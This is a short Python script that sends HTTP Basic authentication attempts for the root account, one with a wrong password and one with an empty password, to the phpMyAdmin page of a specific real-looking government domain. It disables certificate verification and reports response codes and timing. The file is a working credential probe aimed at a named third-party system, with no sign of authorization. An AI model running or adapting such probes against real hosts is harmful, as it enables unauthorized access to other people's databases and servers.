import base64
import time
import ssl
import urllib.request
import scan

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

for pwd in ("definitelywrongpass", ""):
    tok = base64.b64encode(f"root:{pwd}".encode()).decode()
    req = urllib.request.Request("https://www.pc.go.tz/phpmyadmin/",
                                 headers={"User-Agent": scan.UA,
                                          "Authorization": "Basic " + tok})
    t = time.time()
    try:
        with urllib.request.urlopen(req, timeout=25, context=CTX) as r:
            b = r.read(60000).decode("utf-8", "replace")
            print(f"root:{pwd or '<empty>'} -> {r.status} {round(time.time()-t,2)}s "
                  f"pma_username={'pma_username' in b}")
    except Exception as e:
        print(f"root:{pwd or '<empty>'} -> {type(e).__name__} {round(time.time()-t,2)}s")
